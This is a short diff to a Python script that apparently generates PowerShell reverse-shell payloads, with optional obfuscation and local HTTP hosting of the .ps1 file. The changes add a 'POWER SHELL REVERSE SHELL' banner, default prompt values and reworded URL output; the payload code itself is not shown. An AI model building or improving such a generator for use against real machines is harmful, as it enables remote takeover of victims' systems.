@@ -57,7 +57,7 @@ class Generate:
         #list IP as URL for downloading ps1 file
         try:
             
-            print("\nAvailable Network URLs : \n------------------------")
+        
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             try:
                 # 8.8.8.8 is Google DNS, but no data is actually sent over the network
@@ -66,7 +66,7 @@ class Generate:
                 print(f"[+] http://{ip}:{self.hosting_port}/{self.filename}.ps1")
             except Exception:
                 # Fallback to local loopback if the machine is entirely offline
-                print(f"[+] http://127.0.0.1:{self.hosting_port}/{self.filename}.ps1")
+                print(f"[+]Available on :  http://127.0.0.1:{self.hosting_port}/{self.filename}.ps1")
             finally:
                 s.close()
         except Exception:
@@ -121,7 +121,14 @@ class Generate:
             self.host_file()
 
 
-        
+print("""
+██████  ███████ ██████  ███████ 
+██   ██ ██      ██   ██ ██      
+██████  ███████ ██████  ███████ 
+██           ██ ██   ██      ██ 
+██      ███████ ██   ██ ███████ 
+POWER   SHELL   REVERSE SHELL
+      """)   
 
 try:
     server_ip = input("Enter Server IP : ")
@@ -141,9 +148,12 @@ try:
         print("[X] Invalid Ip address.")
         sys.exit(0)
 
-    filename = input("Name For The Generated File : ")
-    obfuscate_script = input("Enable Obfuscation [y/n] : ")
-    host_after_generating = input("Host After Generating [y/n] : ")
+    filename = input("Name For The Generated File [default=test] : ")
+    if filename == "":
+        filename = "test"
+
+    obfuscate_script = input("Enable Obfuscation [y/n] [default=n] : ")
+    host_after_generating = input("Host After Generating [y/n] [default=n] : ")
     enable_obfuscation = True if obfuscate_script=="y" else False
     enable_host = True if host_after_generating=="y" else False
     port_to_host = 0
